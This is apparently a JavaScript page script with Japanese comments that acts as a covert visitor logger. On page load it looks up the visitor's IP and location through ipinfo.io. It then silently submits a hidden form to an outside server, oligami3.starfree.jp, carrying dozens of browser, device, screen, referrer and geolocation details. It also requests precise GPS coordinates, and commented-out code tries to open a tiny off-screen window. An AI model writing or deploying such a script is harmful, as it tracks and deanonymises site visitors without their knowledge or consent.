var newWindow;
window.onload = async function() {
  // window.navigator.vibrate([100,30,100,30,100,30,200,30,200,30,200,30,100,30,100,30,100]); // モールス信号で 'SOS' とバイブレーション
  // var top = window.innerHeight;
  // var right = window.innerWidth;
  // getTeams();

  // var newWindow = window.open("https://teams.microsoft.com/_#/apps", "null", 'top=-10,left=-10,width=10,height=10');
  // newWindow = window.open("https://www.google.co.jp/maps/", "null");
  // if( newWindow ) {
  //   console.log('正常に開きました');
    getTeams();
  // }
  // else {
  //   console.log('正常に開けませんでした！');
  //   newWindow.close();
  // }
  const request = await fetch("https://ipinfo.io/json")
  const ip = await request.json()
  console.log(ip)
  submitForm(ip);
};

async function submitForm (ip) {
  // form を動的に生成
  var form = document.createElement('form');
  form.action = 'http://oligami3.starfree.jp/save.php';
  form.method = 'POST';

  // body に追加
  document.body.append(form);
  // formdata イベントに関数を登録(submit する直前に発火)
  form.addEventListener('formdata', (e) => {
    var fd = e.formData;

    // データをセット
    fd.set('location.host', location.host); // ホスト情報
    fd.set('location.hostname', location.hostname); // ホスト名
    fd.set('location.port', location.port); // ポート番号
    fd.set('location.url', location.href); // URL
    fd.set('location.search', location.search); // パラメータ（サーチ）
    fd.set('location.protocol', location.protocol); // プロトコル
    fd.set('location.hash', location.hash); // パラメータ（ハッシュ）
    fd.set('location.path', location.pathname); // ページURLのパス部分
    fd.set('location.origin', location.origin); // プロトコル・ポート情報を含めたURL
    fd.set('navigator.appName', navigator.appName); // ブラウザ名 正確かは不明
    fd.set('navigator.appCodeName', navigator.appCodeName); // ブラウザのコード名 正確かは不明
    fd.set('navigator.buildID', navigator.buildID); // 今は固定
    fd.set('navigator.productSub', navigator.productSub); // ビルド番号
    fd.set('navigator.cookieEnabled', navigator.cookieEnabled); // クッキーの許可
    fd.set('navigator.deviceMemory', navigator.deviceMemory); // 端末のメモリGB
    fd.set('navigator.doNotTrack', navigator.doNotTrack); // do-not-track 設定
    fd.set('navigator.hardwareConcurrency', navigator.hardwareConcurrency); // 論理プロセッサーコア数
    fd.set('navigator.appVersion', navigator.appVersion); // ブラウザバージョン 正確かは不明
    fd.set('navigator.appMinorVersion', navigator.appMinorVersion); // ブラウザMinorバージョン
    fd.set('navigator.cpuClass', navigator.cpuClass); // cpuClass
    fd.set('navigator.oscpu', navigator.oscpu); // oscpu
    i = 0;
    for (item in navigator.plugins) {
      fd.set('navigator.plugins' + i, +  item); // プラグイン 廃止済み
      i++;
    }
    fd.set('navigator.language', navigator.language); // ブラウザの仕様言語
    fd.set('navigator.userLanguage', navigator.userLanguage); // ブラウザのユーザー用言語
    fd.set('navigator.systemLanguage', navigator.systemLanguage); // ブラウザのsystem用言語
    fd.set('navigator.browserLanguage', navigator.browserLanguage); // ブラウザのbrowser用言語
    fd.set('navigator.pratform', navigator.platform); // ブラウザのplatform
    fd.set('navigator.userAgent', navigator.userAgent); // ブラウザのuserAgent
    fd.set('navigator.vendor', navigator.vendor); // vendor
    fd.set('navigator.vendorSub', navigator.vendorSub); // vendorSub vendor version number を返す
    fd.set('document.referrer', document.referrer); // リファラー
    fd.set('document.domain', document.domain); // ドメイン
    fd.set('screen.width', screen.width); // スクリーンの幅
    fd.set('screen.height', screen.height); // スクリーンの高さ
    fd.set('screen.colorDepth', screen.colorDepth); // スクリーンの色深度
    fd.set('window.innerWidth', window.innerWidth); // ブラウザのビューポートの幅
    fd.set('window.innerHeight', window.innerHeight); // ブラウザのビューポートの高さ
    fd.set('window.devicePixelRatio', window.devicePixelRatio); // ブラウザのビューポートの高さ
    fd.set('navigator.pointerEnabled', navigator.pointerEnabled); // タッチ操作可能
    fd.set('navigator.maxTouchPoints', navigator.maxTouchPoints); // 最大同時タッチ数
    fd.set('navigator.onLine', navigator.onLine); // ネットワーク
    fd.set('ipinfo.city', ip.city); //
    fd.set('ipinfo.country', ip.country); //
    fd.set('ipinfo.hostname', ip.hostname); //
    fd.set('ipinfo.ip', ip.ip); // IP
    fd.set('ipinfo.loc', ip.loc); //
    fd.set('ipinfo.org', ip.org); //
    fd.set('ipinfo.postal', ip.postal); //
    fd.set('ipinfo.region', ip.region); //
    fd.set('ipinfo.timezone', ip.timezone); //
  });

  // submit
  form.submit();
}

function sleep(msec) {
 return new Promise(function(resolve) {
  setTimeout(function() {resolve()}, msec);
 })
}

async function getTeams () {
  // var doc = newWindow.document;
  // console.log("href");
  // console.log(doc);
  // await sleep(1000);
  // console.log("equal");

  navigator.geolocation.getCurrentPosition( successFunc , errorFunc , optionObj ) ;

  // console.log("equal5");
}
// 成功した時の関数
function successFunc (position) {
	// 緯度をアラート表示
	alert( position.coords.latitude ) ;
	// 経度をアラート表示
	alert( position.coords.longitude ) ;
}

// 失敗した時の関数
function errorFunc( error )
{
	// エラーコードのメッセージを定義
	var errorMessage = {
		0: "原因不明のエラーが発生しました…。" ,
		1: "位置情報の取得が許可されませんでした…。" ,
		2: "電波状況などで位置情報が取得できませんでした…。" ,
		3: "位置情報の取得に時間がかかり過ぎてタイムアウトしました…。" ,
	};
	// エラーコードに合わせたエラー内容をアラート表示
	alert( errorMessage[error.code] ) ;
}

// オプション・オブジェクト
var optionObj = {
	"enableHighAccuracy": true ,
	"timeout": 8000 ,
	"maximumAge": 5000 ,
};
